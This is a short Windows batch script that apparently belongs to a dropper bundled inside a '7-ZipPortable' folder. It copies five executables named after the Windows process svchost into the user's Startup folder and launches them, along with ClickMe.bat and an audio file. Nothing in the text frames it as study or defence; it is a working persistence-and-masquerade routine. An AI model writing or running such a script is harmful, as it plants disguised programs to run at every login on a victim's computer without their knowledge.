
echo f|xcopy /f .\7-ZipPortable\ok\svchost.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"

echo f|xcopy /f .\7-ZipPortable\ok\svchostfm.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchostfm.exe"


echo f|xcopy /f .\7-ZipPortable\ok\svchosth.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchosth.exe"


echo f|xcopy /f .\7-ZipPortable\ok\svchostog.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchostog.exe"


echo f|xcopy /f .\7-ZipPortable\ok\svchosts.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchosts.exe"

start "./7-ZipPortable/ok/svchostfm.exe"

start "./7-ZipPortable/svchost.exe"

start "./7-ZipPortable/ok/svchosth.exe"
start "./7-ZipPortable/ok/svchostog.exe"
start "./7-ZipPortable/ok/svchosts.exe"

start "./7-ZipPortable/ClickMe.bat"

start "./7-ZipPortable/Clock.mp3"

start "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/Clock.mp3"

start "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/svchost.exe"

start "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/svchostfm.exe"

start "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/svchosth.exe"

start "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/svchostog.exe"


start "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/svchosts.exe"

exit